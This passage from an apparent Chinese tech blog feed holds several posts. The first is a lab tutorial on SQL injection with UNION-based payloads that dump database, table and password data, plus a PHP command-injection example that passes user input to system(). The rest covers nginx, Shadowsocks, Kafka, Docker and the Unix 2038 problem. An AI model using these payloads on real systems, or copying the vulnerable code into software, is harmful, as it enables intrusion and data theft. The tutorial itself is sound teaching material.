integrity="sha384-PsH8R72JQ3SOdhVi3uxftmaW6Vc51MKb0q5P2rRUpPvrszuE4W1povHYgTpBfshb" crossorigin="anonymous"&gt; &lt;script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"&gt;&lt;/script&gt;&lt;script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.3/umd/popper.min.js" integrity="sha384-vFJXuSJphROIrBnz7yo7oB41mKfc8JzQZiCq4NCceLEaO4IHwicKwpJf9c9IpFgh" crossorigin="anonymous"&gt;&lt;/script&gt;&lt;script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/js/bootstrap.min.js" integrity="sha384-alpBpkh1PFOepccYVYDB4do5UnbKysX5WZXm3XxPqe5iKTfUKjNkCk9SaVuEZflJ" crossorigin="anonymous"&gt;&lt;/script&gt; &lt;style&gt; div&#123; border:1px; width:400px; margin:20px auto; &#125; &lt;/style&gt; &lt;title&gt;sql 注入测试&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;div class="card"&gt; &lt;div class="card-body"&gt; &lt;h2&gt;Login&lt;/h2&gt; &lt;form action="medium.php" method="POST"&gt; Username:&lt;br&gt; &lt;input type="text" class="form-control" name="username" placeholder="username"&gt; Password:&lt;br&gt; &lt;input type="password" class="form-control" name="password" placeholder="password"&gt; &lt;br&gt; &lt;button type="submit" class="btn btn-primary"&gt;Login&lt;/button&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; &lt;/body&gt;&lt;/html&gt; 初步注入11' or '1'='1 猜测查询语句的字段数即要对查询语句1SELECT first_name,last_name FROM users WHERE user_id = '$content' 中的SELECT字段进行猜测1231' or 1=1 order by 1 #1' or 1=1 order by 2 #1' or 1=1 order by 3 # 尝试到3时出现No Found说明SELECT里有两个字段数 查询刚刚猜测的字段顺序11' union select 1,2 # sql语法union是将两个集合去重合并，相当于原本返回admin,admin，现在又存在1,2，通过union后就是两行数据 获取当前数据库名11' union select 1,database() # database()是数据库系统信息函数，作用是获取当前数据库名，其他数据库信息函数有 函数 作用 version() 获取数据库的版本号 connection_id() 获取数据库的连接数 database();schema() 获取当前数据库名 user();system_user() 获取当前用户 current_user() 获取当前用户 charset(str) 获取字符串str的字符集 collation(str) 获取字符串str的字符排列方式 获取当前表名11' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() # mysql在创建时默认创建一个information_schema数据库，在MySQL中，把 information_schema 看作是一个数据库，确切说是信息数据库。其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权 限等。在INFORMATION_SCHEMA中，有数个只读表。它们实际上是视图，而不是基本表，因此，你将无法看到与之相关的任何文件。 information_schema数据库表说明: SCHEMATA表：提供了当前mysql实例中所有数据库的信息。show databases的结果取之此表。 TABLES表：提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息。show tables from schemaname的结果取之此表。 COLUMNS表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。show columns from schemaname.tablename的结果取之此表。 STATISTICS表：提供了关于表索引的信息。show index from schemaname.tablename的结果取之此表。 USER_PRIVILEGES（用户权限）表：给出了关于全程权限的信息。该信息源自mysql.user授权表。是非标准表。 VIEWS表：给出了关于数据库中的视图的信息。需要有show views权限，否则无法查看视图信息 TRIGGERS表：提供了关于触发程序的信息。必须有super权限才能查看该表 获取当前表字段名11' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' # 获取所有数据11' or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users # 视频 php 注入123456&lt;?phpprint("查看文件");print("&lt;p&gt;");$file=$_GET['filename'];system("cat $file");?&gt; 与c代码注入类似，基本在于调用系统的命令来获取结果，诸如php获取系统版本、mysql版本、服务器时间、Web服务器类型等等系统信息，使用系统命令，都可能会产生注入漏洞。在本例中仍然可以在url中注入一些系统命令。 注入防范明白注入的基本方式和原理，很容易知道，通过输入检查来预防注入。获取到输入的字符串，对字符串进行过滤、转义等操作，只不过诸如php的不同输入检查函数，不同的函数的检查方法不一样，但有可能仍然存在编写者本身没有考虑到的可能性，这就导致了漏洞不间断出现。在使用这些检查函数时，要认真查看函数的检查方法以及过滤的东西。在此举个例子: mysqli_real_escape_string( mysqli $link , string $escapestr): Parameters: link: Procedural style only: A link identifier returned by mysqli_connect() or mysqli_init() escapestr: The string to be escaped. Characters encoded are NUL (ASCII 0), \n, \r, \, ‘, “, and Control-Z. Return Value: Returns an escaped string. 123456789101112131415161718192021222324252627&lt;?php$mysqli = new mysqli("localhost", "my_user", "my_password", "world");/* check connection */if (mysqli_connect_errno()) &#123; printf("Connect failed: %s\n", mysqli_connect_error()); exit();&#125;$mysqli-&gt;query("CREATE TEMPORARY TABLE myCity LIKE City");$city = "'s Hertogenbosch";/* this query will fail, cause we didn't escape $city */if (!$mysqli-&gt;query("INSERT into myCity (Name) VALUES ('$city')")) &#123; printf("Error: %s\n", $mysqli-&gt;sqlstate);&#125;$city = $mysqli-&gt;real_escape_string($city);/* this query with escaped $city will work */if ($mysqli-&gt;query("INSERT into myCity (Name) VALUES ('$city')")) &#123; printf("%d Row inserted.\n", $mysqli-&gt;affected_rows);&#125;$mysqli-&gt;close();?&gt; 引用地址 http://www.freebuf.com/articles/web/120747.html http://topspeedsnail.com/hack-command-injection-attack/]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>centos</tag>
        <tag>代码注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[分享会资料]]></title>
    <url>%2F2017%2F12%2F11%2F%E5%88%86%E4%BA%AB%E4%BC%9A%E8%B5%84%E6%96%99%2F</url>
    <content type="text"><![CDATA[ssh ssh服务端、客户端(ssh.config/sshd.config)端口修改 ssh公钥私钥(authorized/id_rsa/id_rsa.pub) 远程主机收到用户的登录请求，把自己的公钥发给用户 用户使用这个公钥，将登录密码加密后，发送回来 远程主机用自己的私钥，解密登录密码，如果密码正确，就同意用户登录 ssh免密(公钥)登录 用户将自己的公钥储存在远程主机上。 登录的时候，远程主机会向用户发送一段随机字符串，用户用自己的私钥加密后，再发回来。 远程主机用事先储存的公钥进行解密，如果成功，就证明用户是可信的，直接允许登录shell，不再要求密码 hosts文件问题为新租的 vps 设置简单的别名访问修改新租的 vps 中 hosts 文件，将百度域名转址为本机 Web服务器Web服务器可以解析HTTP协议。当Web服务器接收到一个HTTP请求,会返回一个HTTP响应,例如送回一个HTML页面。为了处理一个请求Web服务器可以响应一个静态页面或图片，进行页面跳转或者把动态响应的产生委托给一些其它的程序例如CGI脚本，JSP脚本，servlets，ASP脚本，服务器端JavaScript，或者一些其它的服务器端技术。无论它们(译者注：脚本)的目的如何，这些服务器端的程序通常产生一个HTML的响应来让浏览器可以浏览。 apache vs. nginx nginx优点 轻量级，起 web 服务，比 apache 占用更少的内存及资源 抗并发，nginx 处理请求是异步非阻塞的，而 apache 则是阻塞型的，在高并发下 nginx 能保持低资源低消耗高性能 高度模块化的设计，编写模块相对简单 社区活跃，各种高性能模块出品迅速 apache优点 rewrite ，比 nginx 的 rewrite 强大 模块超多，基本想到的都可以找到 少bug ，nginx 的 bug 相对较多 非常稳定 apache是同步多进程模型，一个连接对应一个进程；nginx是异步的，多个连接（万级别）可以对应一个进程 nginx虚拟主机基于端口的虚拟主机基于域名的虚拟主机 nginx反向代理反向代理方式是指用代理服务器来接受 internet 上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给 internet 上请求连接的客户端，此时代理服务器对外就表现为一个反向代理服务器。 举个例子，一个用户访问 http://www.example.com/readme ，但是 www.example.com 上并不存在 readme 页面，它是偷偷从另外一台服务器上取回来，然后作为自己的内容返回给用户。但是用户并不知情这个过程。对用户来说，就像是直接从 www.example.com 获取 readme 页面一样。这里所提到的 www.example.com 这个域名对应的服务器就设置了反向代理功能。 1234567891011121314151617181920212223242526http &#123; include mime.types; server_tokens off; ## 下面配置反向代理的参数 server &#123; listen 80; ## 1. 用户访问 http://ip:port，则反向代理到 https://github.com location / &#123; proxy_pass https://github.com; proxy_redirect off; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; &#125; ## 2.用户访问 http://ip:port/README.md，则反向代理到 ## https://github.com/.../README.md location /README.md &#123; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_pass https://github.com/moonbingbing/openresty-best-practices/blob/master/README.md; &#125; &#125;&#125; 正向代理正向代理就像一个跳板，例如一个用户访问不了某网站（例如 www.google.com ），但是他能访问一个代理服务器，这个代理服务器能访问 www.google.com ，于是用户可以先连上代理服务器，告诉它需要访问的内容，代理服务器去取回来返回给用户。例如一些常见的翻墙工具、游戏代理就是利用正向代理的原理工作的。 安装 Shadowsocks Server 安装python-pip 1yum install python-pip 安装shadowsocks 1pip install shadowsocks 配置 config.json 1234567891011&#123; "server":"0.0.0.0", "server_port":11210, "local_address":"127.0.0.1", "local_port":1080, "password":"*******", "timeout":600, "method":"aes-256-cfb", "fast_open": false, "workers": 1&#125; 运行 Shadowsocks server 脚本参数，设置配置文件路径 设置rc.local里设置开机运行]]></content>
      <categories>
        <category>Web服务器</category>
      </categories>
      <tags>
        <tag>apache</tag>
        <tag>nginx</tag>
        <tag>Shadowsocks</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[分布式计算]]></title>
    <url>%2F2017%2F11%2F30%2F%E5%88%86%E5%B8%83%E5%BC%8F%E8%AE%A1%E7%AE%97%2F</url>
    <content type="text"><![CDATA[大数据知识图谱 分布式计算经典计算模型MapReduceMapReduce论文MapReduce编程基于 MapReduce 的并行计算框架 开源计算框架hadoopApache Hadoop 是用于开发在分布式计算环境中执行的数据处理应用程序的框架。类似于在个人计算机系统的本地文件系统的数据，在 Hadoop 数据保存在被称为作为Hadoop分布式文件系统的分布式文件系统。处理模型是基于“数据局部性”的概念，其中的计算逻辑被发送到包含数据的集群节点(服务器)。这个计算逻辑不过是写在编译的高级语言程序，例如 Java. 这样的程序来处理Hadoop 存储 的 HDFS 数据。Hadoop是一个开源软件框架。使用Hadoop构建的应用程序都分布在集群计算机商业大型数据集上运行。商业电脑便宜并广泛使用。这些主要是在低成本计算上实现更大的计算能力非常有用。计算机集群由一组多个处理单元(存储磁盘+处理器)，其被连接到彼此，并作为一个单一的系统。 官网教程中文文档 sparkSpark是基于内存计算的大数据并行计算框架.Spark基于内存计算，提高了在大数据环境下数据处理的实时性,同时保证了高容错性和高可伸缩性,允许用户将Spark部署在大量的廉价硬件之上,形成集群。Spark是MapReduce的替代方案，而且兼容HDFS、Hive等分布式存储层，可融入Hadoop的生态系统，以弥补缺失MapReduce的不足 官方良心文档中文文档编程指导流式编程 kafkaApache Kafka发源于LinkedIn，于2011年成为Apache的孵化项目，随后于2012年成为Apache的主要项目之一。Kafka使用Scala和Java进行编写。Apache Kafka是一个快速、可扩展的、高吞吐、可容错的分布式发布订阅消息系统。Kafka具有高吞吐量、内置分区、支持数据副本和容错的特性，适合在大规模消息处理场景中使用。 生产者消费者模型Apache kafka 工作原理介绍Kafka快速开始(官方良心文档，最快的方式知道kafka是什么，它在干什么)Kafka生产者编程Kafka生产者编程Kafka消费者编程Kafka消费者编程Kafka流式计算API StormApache Storm是一种侧重于极低延迟的流处理框架，也许是要求近实时处理的工作负载的最佳选择。该技术可处理非常大量的数据，通过比其他解决方案更低的延迟提供结果。Storm 顶级抽象图 Storm官方概念Storm官方实例代码Storm示例代码Storm优秀博客 工作室产出文章hadoop安装http://fenlan.github.io/2017/09/22/hadoop/#moreKafka安装http://fenlan.github.io/2017/11/29/zookeeper-kafka/#more]]></content>
      <categories>
        <category>分布式计算</category>
      </categories>
      <tags>
        <tag>Kafka</tag>
        <tag>hadoop</tag>
        <tag>storm</tag>
        <tag>spark</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Zookeeper Kafka 安装]]></title>
    <url>%2F2017%2F11%2F29%2Fzookeeper-kafka%2F</url>
    <content type="text"><![CDATA[Zookeeper 安装下载Zookeeper官方下载地址https://zookeeper.apache.org/releases.html 环境搭建 解压下载包，并将解压的目录重命名为zookeeper 将 zookeeper/conf/zoo_sample.cfg 拷贝一份命名为 zoo.cfg zoo.cfg配置 1234567891011121314151617181920212223242526272829303132# The number of milliseconds of each ticktickTime=2000# The number of ticks that the initial# synchronization phase can takeinitLimit=10# The number of ticks that can pass between# sending a request and getting an acknowledgementsyncLimit=5# the directory where the snapshot is stored.# do not use /tmp for storage, /tmp here is just# example sakes.dataDir=~/zookeeper/datadataLogDir=~/zookeeper/logs# the port at which the clients will connectclientPort=2181# the maximum number of client connections.# increase this if you need to handle more clients#maxClientCnxns=60## Be sure to read the maintenance section of the# administrator guide before turning on autopurge.## http://zookeeper.apache.org/doc/current/zookeeperAdmin.html#sc_maintenance## The number of snapshots to retain in dataDir#autopurge.snapRetainCount=3# Purge task interval in hours# Set to "0" to disable auto purge feature#autopurge.purgeInterval=1server.1=kafka-server1:2888:3888server.2=kafka-server2:2888:3888 配置文件中的dataDir和dataLogDir最好设置在zookeeper目录下，并在集群中每台主机的这两个目录下写一个myid文件，文件内容为集群中每台主机对应的集群编号，编号与配置文件zoo.cfg最后两行对应，即kafka-server1这台主机的编号为1，kafka-server2的编号为2`。 在每台主机上zookeeper/bin目录下运行./zkSever.sh start启动集群。 在每台主机上zookeeper/bin目录下运行./zkServer.sh status查看状态。 启动成功为看到集群中一台主机为leader其他主机为follower，如果启动失败，会提示not running 每台主机上zookeeper/bin目录下运行./zkServer.sh stop关闭集群 kafka 安装下载kafka官方下载地址https://kafka.apache.org/ 环境搭建kafka依赖于zookeeper管理，因此安装kafka要先安装zookeeper并确保zookeeper安装成功，同样启动kafka要先启动zookeeper 配置server.propertiesserver.properties中修改三个配置: breker.id设置为该主机在zookeeper集群中的编号; listeners监听该主机的9092端口，具体值在配置文件中有提示; zookeeper.connect设置为zookeeper集群，例如kakfa-server1:2181,kafka-server2:2181 配置producer.propertiesproducer.properties中配置bootstrap.servers为kafka-server1:9092,kafka-server2:9092 配置consumer.propertiesconsumer.properties中配置zookeeper.connect为kakfa-server1:2181,kafka-server2:2181 每台主机启动kafka 1bin/kafka-server-start.sh -daemon config/server.properties 每台主机关闭kafka 1bin/kafka-server-stop zookeeper and kafka启动集群时，先启动zookeeper，再启动kafka；关闭集群时先关闭kafka，再关闭zookeeper 建议集群是否搭建成功关键在于有没有比较清楚的了解zookeeper和kafka，网上教程很多，照搬网上教程是大忌，要充分理解配置的意义，诸如kafka-server1``kafka-server2在集群通信问题，以及部分教程要求修改/etc/hosts的目的。没有充分理解配置，配置集群是一条漫长而迷茫的路。如果在linux中配置过一些东西，会有相当多的经验，经验也很重要。]]></content>
      <categories>
        <category>分布式计算</category>
      </categories>
      <tags>
        <tag>Kafka</tag>
        <tag>Zookeeper</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Docker]]></title>
    <url>%2F2017%2F11%2F27%2Fdocker%2F</url>
    <content type="text"><![CDATA[概述Docker 是世界领先的软件容器平台。开发人员利用 Docker 可以消除协作编码”在我的机器上可正常工作”的问题。运维人员利用 Docker 可以在隔离容器中并行运行和管理应用，获得更好的计算密度。企业利用 Docker 可以构建敏捷的软件交付管道，以更快的速度、更高的安全性和可靠的信誉为 Linux 和 Windows Server 应用发布新功能。更加全面的介绍 容器image是一个轻量级的，独立的可执行程序包，包含运行一个软件所需的所有东西，包括代码，运行时库，环境变量和配置文件。container是image的运行时实例 —- image在实际执行时在内存中变成的内容。默认情况下，它与主机环境完全隔离，只有在配置时才访问主机文件和端口。容器(containers)在主机的内核上本地运行应用程序。它们比只能通过管理程序虚拟访问主机资源的虚拟机具有更好的性能特征。容器可以获得本地访问权限，每个容器都以独立的进程运行，不会花费比其他可执行文件更多的内存。 虚拟机 vs. 容器虚拟机架构虚拟机运行客户操作系统 —- 每个框中的操作系统层。这是资源密集型的，产生的磁盘映像和应用程序状态是操作系统设置。系统安装的依赖关系，操作系统安全补丁和其他易于丢失的东西，难以复制重用 容器架构容器可以共享一个内核，并且唯一需要在容器镜像中的信息是可执行文件及其包依赖关系(the only information that needs to be in a container image is the executable and its package dependencies)，它们永远不需要安装在主机系统上。这些进程像本地进程一样运行，你可以像docker ps一样运行命令来单独管理它们，就像在Linux上运行ps来查看活动进程一样。最后，因为它们包含了所有的依赖关系，所以没有配置纠缠。一个集装箱化的应用程序”随处运行” 安装Docker卸载旧版本1234$ sudo yum remove docker \ docker-common \ docker-selinux \ docker-engine 安装Docker CE(Community Edition)软件库安装123$ sudo yum install -y yum-utils \ device-mapper-persistent-data \ lvm2 123$ sudo yum-config-manager \ --add-repo \ https://download.docker.com/linux/centos/docker-ce.repo 1$ sudo yum install docker-ce 开启Docker1$ sudo systemctl start docker Hello World1234567$ docker run hello-worldHello from Docker!This message shows that your installation appears to be working correctly.To generate this message, Docker took the following steps:...(snipped)... Building an app现在是开始构建Docker方式的应用程序的时候了。我们将从这个应用程序的层次结构的底部开始，这个应用程序是一个容器。在这个层次上面是一个服务，它定义了容器在生产中的行为方式。最后，在顶层是堆栈，定义了所有服务的交互。过去，如果你要开始编写一个Python应用程序，你的第一步就是在你的机器上安装一个Python运行库。但是，这会造成您的机器上的环境必须如此以使您的应用程序按预期运行。 使用Docker，您可以将一个可移植的Python运行时作为一个镜像来获取，无需安装。然后，您的构建可以将基础Python镜像与应用程序代码一起包括在内，确保您的应用程序和依赖项一起运行。这个可移植的镜像被定义为Dockerfile Dockerfile创建一个空的目录，cd进入空目录，创建一个Dockerfile文件,requirement.txt文件,app.py文件1234567891011121314151617181920# Use an official Python runtime as a parent imageFROM python:2.7-slim# Set the working directory to /appWORKDIR /app# Copy the current directory contents into the container at /appADD . /app# Install any needed packages specified in requirements.txtRUN pip install --trusted-host pypi.python.org -r requirements.txt# Make port 80 available to the world outside this containerEXPOSE 80# Define environment variableENV NAME World# Run app.py when the container launchesCMD ["python", "app.py"] requirements.txt12FlaskRedis app.py123456789101112131415161718192021222324from flask import Flaskfrom redis import Redis, RedisErrorimport osimport socket# Connect to Redisredis = Redis(host="redis", db=0, socket_connect_timeout=2, socket_timeout=2)app = Flask(__name__)@app.route("/")def hello(): try: visits = redis.incr("counter") except RedisError: visits = "&lt;i&gt;cannot connect to Redis, counter disabled&lt;/i&gt;" html = "&lt;h3&gt;Hello &#123;name&#125;!&lt;/h3&gt;" \ "&lt;b&gt;Hostname:&lt;/b&gt; &#123;hostname&#125;&lt;br/&gt;" \ "&lt;b&gt;Visits:&lt;/b&gt; &#123;visits&#125;" return html.format(name=os.getenv("NAME", "world"), hostname=socket.gethostname(), visits=visits)if __name__ == "__main__": app.run(host='0.0.0.0', port=80) 使用命令创建一个Docker镜像12345$ docker build -t friendlyhello .$ docker imagesREPOSITORY TAG IMAGE IDfriendlyhello latest 326387cea398 Run the app运行应用程序，使用-p将您的机器的端口4000映射到容器的已发布端口80：1$ docker run -p 4000:80 friendlyhello 你应该看到一条消息，Python在http://0.0.0.0:80上提供你的应用程序。但是，这个消息来自容器内部，它不知道你将该容器的端口80映射到4000，所以正确的URL为http://localhost:4000。在Web浏览器中转到该URL以查看网页上显示的显示内容，包括“Hello World”文本，容器标识和Redis错误消息。 现在让我们以分离模式在后台运行应用程序：1$ docker run -d -p 4000:80 friendlyhello 你得到你的应用程序的长容器ID，然后被踢回你的终端。您的容器正在后台运行。您还可以使用docker container ls查看缩略容器标识123$ docker container lsCONTAINER ID IMAGE COMMAND CREATED1fa4ab2cf395 friendlyhello "python app.py" 28 seconds ago 现在使用docker container stop来结束进程，使用CONTAINER ID，如下所示：1docker container stop 1fa4ab2cf395 Share your image为了演示我们刚刚创建的容器的可移植性，我们上传我们构建的映像，并在其他地方运行它。毕竟，当你想将容器部署到生产环境时，你需要学习如何push到一个公共地方。如果你还没有Docker帐号，需要在这里注册一个帐号本地登录你的Docker库1$ docker login 关联本地镜像像与注册表(registry)中存储库的符号是username/repository:tag。该标签是可选的，但推荐使用，因为这是注册管理机构管理Docker镜像版本的机制。给存储库标记有意义的名字，比如get-started:part2。这会将镜像放入get-started存储库中，并将其标记为part2。现在，把它们放在一起来标记镜像。使用您的用户名，存储库和标签名称运行docker tag image，以便将镜像上传到您想要的目的地。该命令的语法是:1$ docker tag image username/repository:tag For example:1$ docker tag friendlyhello john/get-started:part2 查看你新标记的镜像123456$ docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEfriendlyhello latest d9e555c53008 3 minutes ago 195MBjohn/get-started part2 d9e555c53008 3 minutes ago 195MBpython 2.7-slim 1c7128a655f6 5 days ago 183MB... 发布镜像1$ docker push username/repository:tag 拉取并运行远端库1docker run -p 4000:80 username/repository:tag 速查表12345678910111213141516docker build -t friendlyname .# 使用此目录的 Dockerfile 创建镜像docker run -p 4000:80 friendlyname # 运行端口 4000 到 90 的“友好名称”映射docker run -d -p 4000:80 friendlyname # 内容相同，但在分离模式下docker ps # 查看所有正在运行的容器的列表docker stop &lt;hash&gt; # 平稳地停止指定的容器docker ps -a # 查看所有容器的列表，甚至包含未运行的容器docker kill &lt;hash&gt; # 强制关闭指定的容器docker rm &lt;hash&gt; # 从此机器中删除指定的容器docker rm $(docker ps -a -q) # 从此机器中删除所有容器docker images -a # 显示此机器上的所有镜像docker rmi &lt;imagename&gt; # 从此机器中删除指定的镜像docker rmi $(docker images -q) # 从此机器中删除所有镜像docker login # 使用您的 Docker 凭证登录此 CLI 会话docker tag &lt;image&gt; username/repository:tag # 标记 &lt;image&gt; 以上传到镜像库docker push username/repository:tag # 将已标记的镜像上传到镜像库docker run username/repository:tag # 运行镜像库中的镜像 服务了解服务在分布式应用中，应用的不同部分称为“服务”。例如，假设有一个视频共享网站，它可能提供用于在数据库中存储应用程序数据的服务、用于在用户上传一些内容后在后台进行视频转码的服务、用于前端的服务等。 服务实际上是“生产中的容器”。一项服务仅运行一个镜像，但它会编制镜像的运行方式 - 它应使用的端口、容器的多少个从节点应运行才能使服务的容量满足其需求等。扩展服务将更改运行该软件的容器实例数，并将多个计算资源分配给进程中的服务。 幸运的是，很容易使用 Docker 平台定义、运行和扩展服务 – 只需编写一个docker-compose.yml文件即可。 docker-compose.yml12345678910111213141516171819version:"3"services: web: # 将 username/repo:tag 替换为您的名称和镜像详细信息 image: username/repository:tag deploy: replicas:5 resources: limits: cpus:"0.1" memory:50M restart_policy: condition: on-failure ports: - "80:80" networks: - webnetnetworks: webnet: 此 docker-compose.yml 文件会告诉 Docker 执行以下操作： 从镜像库中拉取我们上传的镜像。 将该镜像的五个实例作为服务web运行，并将每个实例限制为最多使用 10% 的 CPU（在所有核心中）以及 50MB RAM。 如果某个容器发生故障，立即重启容器。 将主机上的端口 80 映射到 web 的端口 80。 指示web容器通过负载均衡的网络webnet共享端口 80。（在内部，容器自身将在临时端口发布到 web 的端口 80。） 使用默认设置定义webnet网络（此为负载均衡的overlay网络）。 运行新的负载均衡(load-balanced)的应用需要先运行以下命令，然后才能使用docker stack deploy命令：1docker swarm init 现在，运行此命令。您必须为应用指定一个名称。在此处该名称设置为getstartedlab：1docker stack deploy -c docker-compose.yml getstartedlab 查看您刚才启动的五个容器的列表：1docker stack ps getstartedlab 您可以多次在一行中运行curl http://localhost，也可以在浏览器中转至该 URL 并多次点击“刷新”。无论采用哪种方式，您都将看到容器 ID 更改，从而说明负载均衡；借助每项请求，将以循环方式选择五个从节点之一做出响应。 注：在此阶段，容器最多可能需要 30 秒来响应 HTTP 请求。这并不代表 Docker 或 swarm 的性能，而是一项未满足的 Redis 依赖关系，我们稍后将在本教程中讨论此依赖关系。 扩展应用您可以通过在docker-compose.yml中更改replicas值，保存更改并重新运行docker stack deploy命令来扩展应用：1docker stack deploy -c docker-compose.yml getstartedlab Docker 将执行原地更新，而无需先清除技术栈或终止任何容器。现在，重新运行docker stack ps命令以查看经过重新配置的已部署实例。例如，如果您扩展了从节点，将有更多处于运行状态的容器。 清除应用和 swarm使用docker stack rm清除应用：1docker stack rm getstartedlab 这将删除应用，但我们的单节点swarm仍处于正常运行状态（如docker node ls所示）。使用docker swarm leave --force清除 swarm。 速查表12345docker stack ls # 列出此 Docker 主机上所有正在运行的应用docker stack deploy -c &lt;composefile&gt; &lt;appname&gt; # 运行指定的 Compose 文件docker stack services &lt;appname&gt; # 列出与应用关联的服务docker stack ps &lt;appname&gt; # 列出与应用关联的正在运行的容器docker stack rm &lt;appname&gt; # 清除应用 Swarm引用Docker中文文档 Swarm 技术栈引用Docker中文文档 技术栈 引用链接 Docker中文 Get Docker CE for CentOS Docker官网文档 Docker 服务]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Unix 时间问题(非原创)]]></title>
    <url>%2F2017%2F11%2F21%2Funix%E6%97%B6%E9%97%B4md%2F</url>
    <content type="text"><![CDATA[故事缘由有时候不得不相信，有些东西就是刚刚好，刚刚好到来，刚刚好知道，刚刚好契合。因为这些刚刚好，就会不由自主的激动，感觉这些刚知道的东西发生在自己身上。这次要说的是unix时间问题，我最开始接触这个问题是我们云计算课程项目中一个小小的时间问题，当时项目中所有的时间都是通过unix时间记录。所谓unix时间，就是记录从unix元年1970年1月1日0点起到当前时间经过的秒数。这个问题最开始我并没有觉得有什么问题，但后来我在网上瞎逛的时候看见了一篇文章 十大著名的计算机发展史上的软件缺陷 ,这里就讲到了一个unix时间问题，我就很好奇的去了解这一个故事，而在这个时间点，我们正在进行的操作系统课程也讲到了unix时间，所以这一堆堆事情，就刚刚好地发生了。 2038问题2038年问题的成因与20世纪90年代曾经名噪一时的千年虫问题很类似。千年虫问题是因为早期(早在20世纪50年前以前)程序员们使用两位十进制数字来表示年份(为了节约存储空间和书写程序的便利)，并且在很长一段时间内，没有意识到这么做可能给后人带来的麻烦;当所有人都习惯这么做时，随着软件系统变得越来越复杂，小问题就逐渐变成大问题了。 说起Unix上的2038年问题，时间要追溯到1969年。当Ken Thompson和Dennis Ritchie在贝尔实验室里捣鼓他们的新玩意时，他们肯定没有想到他们的小发明将来会在全世界发挥如此大的影响力。他们决定把他们所创造的这个支持多用户多任务的新操作系统命名为UNIX，以一个32位二进制数所能表示的有符号整数范围（-2,147,483,648 ~ +2,147,483,647）所代表的秒数作为Unix纪元（Unix epoch）时间，把西元1970年1月1日0时0分0秒定为Unix纪元的元年。 在Unix历的约第100,000,000秒（或者，用人类的纪年法，大约在西元1972~1973年之间），一种叫做C的高级程序语言被发明出来了。于是，贝尔实验室的这帮人用C语言重写了他们的UNIX系统内核，很自然地，系统库中用于存储时间的time_t类型的typedef定义，就采用了C语言中对应的32位有符号整型（signed int32）来实现。 起初，一切都很好。UNIX走出了贝尔实验室中少数研究人员的小圈子，得到了工业界的青睐，好几家商业公司都发行了自己的Unix变体，其中包括最早的商业版UNIX System V以及后来的IBM AIX、HP-UX、SGI的IRIX和微软的Xenix，它们被广泛用在各式大中小型主机和服务器上。到了80年代初，当时在麻省理工大学人工智能实验室工作的一个大胡子黑客不满于Unix这种专有软件的闭源开发模式，他决定重写一个完全自由的仿Unix操作系统，但又不是Unix，这就是后来的GNU (GNU is Not Unix) Project；与此同时，在西海岸，UC Berkeley的另一群黑客获得了一部分来自最初贝尔实验室的Unix原始代码，他们在此基础上开发出属于自己的一套“伯克利软件发行包（Berkeley Software Distribution）”，这演变成了后来的BSD家族。很快，时间已经到了Unix纪元的第31年，在大洋彼岸的北欧国家芬兰，一个年轻大学生自己写了一个仿Unix内核，受到当时GNU发起的自由软件运动的影响，他决定把这个内核以GPL协议发放出来，让全世界的黑客们来共同使用、参与开发。恰好那时GNU操作系统还没有自己的成熟内核，这个后来被命名为“Linux”的仿Unix内核借着与GNU Project的结合获得了广泛的成功与关注。最终，就有了我们今天所使用的GNU/Linux。在很长一段时间里，不管是真正的Unix和由它直接衍生而来的BSD、Solaris，还是试图“仿造出”Unix的GNU/Linux，抑或是为了统一各种类Unix（*nix）系统而生的POSIX标准，所有的类Unix系统都把time_t类型理所当然地等价为C语言中的原生数据类型signed int32，无数的库和工具被基于它写出来，很多网络上的服务与应用也是基于这个事实的标准。 终于有一天，人们意识到，32 bits整数所能表示的数目大小毕竟是有限的，更何况这个数字是以秒作为单位。对于正在各行各业发挥着越来越重要作用的类Unix系统来说，当初的设定显然也太目光短浅了些。 32位有符号整型所能表示的最大数是+2,147,483,647。2147483647秒 = 24855天 = 68年。也就是说，自Unix纪元的元年（1970年）起，再过68年，所有现存的32位类Unix系统都将迎来历法上的终结——对+2,147,483,647加1将造成一个算术溢出：在大部分系统上，返回值会变成-2,147,483,648，在少数系统上，返回值可能是0。许多依赖于系统时间的程序将无法正常工作，计算机的时钟也将退回到1901年（或者1970年）。它们将无法正确处理那之后的时间。 这个准确的时刻是：协调世界时2038年1月19日3时14分7秒（未考虑闰秒）。你可以在维基百科上找到更多的信息。 更多的“xx”年问题一个与Unix的2038年问题相类似的是NTP协议的2036年问题。NTP协议的时间戳采用了和Unix相似的32位整数表示，不同于Unix的1970 ± 68年范围，NTP使用的是无符号整型，并且以1900作为时间的起点，这意味着它的终点将是1900 + 136 = 2036年2月6日。 和2038年问题直接相关的两个历史事件是2001年9月9日问题和2004年日本银行ATM机故障：2001年9月9日问题又被称作S1G（Second 1 Giga，一吉秒）或者S1B（Second 1 